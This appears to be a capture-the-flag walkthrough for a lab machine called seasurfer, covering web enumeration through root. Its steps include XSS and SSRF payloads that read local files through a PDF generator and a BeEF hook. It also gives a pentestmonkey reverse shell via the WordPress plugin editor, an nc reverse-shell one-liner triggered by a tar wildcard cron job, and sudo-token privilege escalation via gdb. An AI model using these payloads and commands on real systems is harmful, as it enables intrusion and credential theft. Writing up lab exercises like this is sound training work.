**Target:  10.10.179.66   seasurfer**

**Initial Access:**\
nmap -Pn --min-rate=5000 10.10.179.66 -p- |grep open |awk -F '\n' '{print $1}'|tr '\n' ','\
Output shows open ports: 22,80

Enumerating these open ports further with nmap:\
nmap -Pn 10.10.179.66 -p 22,80 -sC -sV -oN nmap.seasurfer

![image](https://user-images.githubusercontent.com/93153300/199278056-97593734-4781-48dc-a6e2-8453c8bfb4c4.png)
  
Navigate to port 80 finds nothing of interest, just the default apache page.  Directory brute force also found nothing of interest.  Let’s investigate port 80 further with burpsuite.   Configure the browser  to send requests through burpsuite (whether through the browser proxy settings itself or with something like foxyproxy).  Capturing the request http://10.10.179.66  in burpsuite, and sending it to repeater shows:

![image](https://user-images.githubusercontent.com/93153300/199278118-4fc74de2-a6f6-4523-836f-bbd474f1dc65.png)

Found a strange header: X-Backend-Server: seasurfer.thm\
Add to /etc/hosts:  10.10.179.66 seasurfer.thm.  Navigate to seasurfer.thm

This site looks like a wordpress site.  Looking at browser extension wappalyzer, it confirms that it’s running wordpress.  Use wpscan to enumerate: wpscan --url http://seasurfer.thm/ -e u,vp  → found user kyle. 

Run directory brute force: gobuster dir -u http://seasurfer.thm -x txt,php -w /usr/share/wordlists/dirb/big.txt \
Two interesting directories found with gobuster are /wp-login.php and /adminer.\
Wp-login.php is a login page, we don’t have credentials yet.  Navigating to /adminer shows:

![image](https://user-images.githubusercontent.com/93153300/199278159-f138058a-8dc3-44ea-8383-4bfc0b23b2f5.png)
 
Another login page, we don’t have credentials yet, so move on.\
http://seasurfer.thm mentions an old website and soon to come online shoppting site:

![image](https://user-images.githubusercontent.com/93153300/199278201-8f3c9389-5a31-4c82-8f23-0a979ca2f9bc.png)

Check for subdomains with wfuzz, maybe we can find the old website or find the soon to come shopping site:\
wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.seasurfer.thm" -u "http://seasurfer.thm" --hh 10918

wfuzz found subdomain internal  → add to /etc/hosts:  10.10.179.66   internal.seasurfer.thm\
Navigating to the page shows:

![image](https://user-images.githubusercontent.com/93153300/199278237-993aacd8-5e9e-4c8f-b82d-b8e7714ff23c.png)

Fill out customer name, additional comment, and item (I’ll use the word ‘testing’ for all 3 words). Then click create receipt.  This creates a pdf file with out input: 

![image](https://user-images.githubusercontent.com/93153300/199278281-c6748b22-dbcc-47b4-9968-faac45520258.png)
 
A web page that uses user input to create a pdf is often vulnerable to cross site scripting.   A simple search on google for ‘hacktricks pdf converter’ brings up a hacktricks page with plenty of xss payloads for pdf converter: https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf 

First, a simple proof of concept payload: ```<img src="x" onerror="document.write('test')"/>```  \
You can enter this payload into the customer name, additional comment, or item.  The payload works on all 3 of them.  

![image](https://user-images.githubusercontent.com/93153300/199278315-28b3af69-3ee5-4129-b077-1e8428965eb1.png)
 
Now that we have proof of concept, let’s turn this into a payload to read local files on the target.  The payload is: <iframe src=file:///etc/passwd></iframe> \
Running this payload through the pdf converter shows an empty iframe.  It doesn’t show /etc/passwd. Let’s try a different malicious payload.  Use beef to hook the target.  To use beef, run command beef-xss in terminal. 

![image](https://user-images.githubusercontent.com/93153300/199278351-e06a840b-bbf2-4784-aaf5-4509c9524e7d.png)

Next, open beef in the browser by going to http://127.0.0.1:3000/ui/panel.  The output from the command beef-xss provides us with the hook we will use: <script src="http://10.2.1.148:3000/hook.js"></script>  
Put that hook into one of the user inputs on internal.seasurfer.thm.  Then click on create receipt to run the pdf converter.  The beef browser page shows internal.seasurfer.thm is hooked:

![image](https://user-images.githubusercontent.com/93153300/199278400-296f28d2-45ac-4fb8-879f-11b2721fc662.png)

Unfortunately for us, the hook doesn’t last long.  Using persistence methods on beef to try to keep it going longer does not help either. However, we can still look through the details that beef found about the target, let’s take a look: 
 
![image](https://user-images.githubusercontent.com/93153300/199278454-1ec5ee6d-4218-4744-ad07-119c1823d7c5.png) 

The browser.name.reported shows wkhtmltopdf.  A quick google search on wkhtmltopdf shows that certain versions of wkhtmltopdf is vulnerable to server side request forgery. Going back to internal.seasurfer.thm site, open the developer tools with f12 and go to Console:

![image](https://user-images.githubusercontent.com/93153300/199278517-975c58c1-c12c-4935-a8c1-a8e781e981be.png)
 
Console shows the version of wkhtmltopdf is 0.12.5.  This version is vulnerable to ssrf, and can be used to read local files (lfi) on the target.   

Steps for ssrf to lfi:\
Step 1: create a php file with the following content:  ```<? php header('location:file://'.$_REQUEST['file']); ?>```\
Step 2: host the php file with a php web server: php -S 0.0.0.0:80  (Don’t use a python web server because it won’t execute our hosted php file.)\
Step 3: Go to the pdf creator page on internal.seasurfer.thm, and insert in one of the user input fields the following payload: <iframe height="5000" width="1000" src=http://10.2.1.148/testing.php?file=/etc/passwd></iframe>

Running the pdf creator with these 3 steps works, it shows the /etc/passwd file:
 
![image](https://user-images.githubusercontent.com/93153300/199278566-436d114c-f62f-48ec-92ce-7292d2025250.png)

Use this ssrf to lfi to read wp-config.php: <iframe height="5000" width="1000" src=http://10.2.1.148/testing.php?file=/var/www/wordpress/wp-config.php></iframe>
 
Running this with the pdf creator found credentials:

![image](https://user-images.githubusercontent.com/93153300/199278622-0ca788c3-4dd9-433a-8920-146b49063ad6.png)
  
Use these credentials to log into http://seasurfer.thm/adminer.  After login, it shows the wordpress database → click on wordpress → click on table wp_users → click on select data.   Found username kyle and hashed password:

![image](https://user-images.githubusercontent.com/93153300/199278667-0d05bc84-2560-425b-99ec-d48ed4fbc845.png)
 
Save the hash in a file and call it hash.  Use command ‘nth’ to find the type of hash:  nth -f hash\
nth returns that the hash is Wordpress ≥ v2.6.2, HC: 400 JtR: phpass.   Crack the hash with hashcat:\
hashcat -m 400 hash  /usr/share/wordlists/rockyou.txt → cracked: jenny4ever

Use these credentials to log into wordpress on wp-login.php.  Next, use the plugin editor to get a reverse shell, follow these steps: click on plugins (on the left panel)→ plugin file editor → select plugin to edit hello dolly (top right corner) → hello.php→  Replace hello.php content with php pentest monkey reverse shell → click update file (bottom left corner).  Open netcat listener: nc -lvnp 443 (I will use pwncat-cs -lp 443 bc pwncat gives a better shell).  Navigate to seasurfer.thm/wp-content/plugins/hello.php.  We get shell as www-data. 
_______________________________________________
**Lateral Movement**:\
Found crontab running tar with wildcard in /var/www/internal/maintenance/backup.sh:
 
![image](https://user-images.githubusercontent.com/93153300/199278733-211fe847-c670-4495-8ae7-5c4af8a4f751.png)
 
Google search ‘crontab tar wildcard’ shows plenty of articles that will show how to exploit this.\
The file backup.sh shows that the tar command is being run on files in /var/www/internal/invoices directory, so make sure to run the following commands in that directory.\
Step 1: echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.2.1.148 443 >/tmp/f" > shell.sh \
Step 2: echo "" > "--checkpoint-action=exec=sh shell.sh" \
Step 3: echo "" > --checkpoint=1 \
Step 4: open pwncat/nc listener and wait for the crontab to run: pwncat-cs -lp 443 \
Got shell as kyle. Can get the flag at /home/kyle/user.txt

For persistence on user kyle, create ssh keys for kyle and ssh into user kyle. Use the following commands:\
ssh-keygen → cp id_rsa.pub authorized_keys → Download id_rsa → in our terminal run chmod 600 id_rsa → ssh -i id_rsa kyle@seasurfer.thm
___________________________________________________________
**Privilege Escalation:**\
Upload and run linpeas.sh.  Linpeas returned 2 points of interest: 

![image](https://user-images.githubusercontent.com/93153300/199278765-e60a755d-86ae-4c4b-aa09-64394b17a0de.png)
  
![image](https://user-images.githubusercontent.com/93153300/199278791-a65501f6-8ced-4c4c-a1d5-8e1625226459.png)

Go to the hacktricks page linpeas referenced, and go to the ‘Reusing Sudo Tokens’ section on that page. The page shows the following exploit for privilege escalation:

![image](https://user-images.githubusercontent.com/93153300/199278840-b50b900f-c1be-4f8e-a1e4-3ad014beb630.png)
 
Hacktricks shows what we need in order for this exploit to work.  Let’s check and see if we have what is needed to use this exploit.  We have shell as kyle, so that fulfills the first requirement.  The second requires we have used sudo in the last 15 minutes.  As we mentioned above, linpeas showed that kyle has a sudo process running, so we have the second requirement.  Linpeas showed us that ptrace protection is 0, so we have the third requirement.  However, we do not have gdb.  We can’t install gdb with apt install because we need sudo for that.   But we can install gdb with dpkg.  Download gdb from http://old-releases.ubuntu.com/ubuntu/pool/universe/g/gdb/ (I chose gdb-multiarch_9.1-0ubuntu1_amd64.deb).  Upload the downloaded gdb to the target.  Next, install the gdb we uploaded to the target with command: dpkg -x  gdb-multiarch_9.1-0ubuntu1_amd64.deb gdbfile. \
Set the path: export PATH=$PATH:/home/kyle/gdbfile/usr/bin.  Go to /home/kyle/gdbfile/usr/bin and change the name to gdb: mv gdb-multiarch gdb.\
Next, download the github sudo_inject that hacktricks showed above: git clone https://github.com/nongiach/sudo_inject.git.   Go to the ‘extra tools’ directory in sudo_inject and run command ‘make’.  Upload  the sudo_inject directory to the target.   \
Run exploit.sh_v2.sh: bash exploit_v2.sh → creates a suid sh shell in /tmp  \
Run command: /tmp/sh -p \
Got shell as root

![image](https://user-images.githubusercontent.com/93153300/199278893-910dce3e-c715-465f-8073-a437ece36aa0.png)
 _____________________________________________________________ 
**Understanding how the exploit works/manual exploitation:** \
What this exploit does is actually pretty simple.  Gdb connects to the process id that is running the sudo command.  Once gdb connects to the process that is running sudo, we can execute commands from gdb with sudo privileges.  \
To exploit manually, these are the commands: \
ps aux| grep kyle    → found process id 1145 for the process running sudo \
gdb -q -n -p 1145 \
call system("echo | sudo -S chmod +s /bin/bash 2>&1") \
/bin/bash -p \
We have shell as root
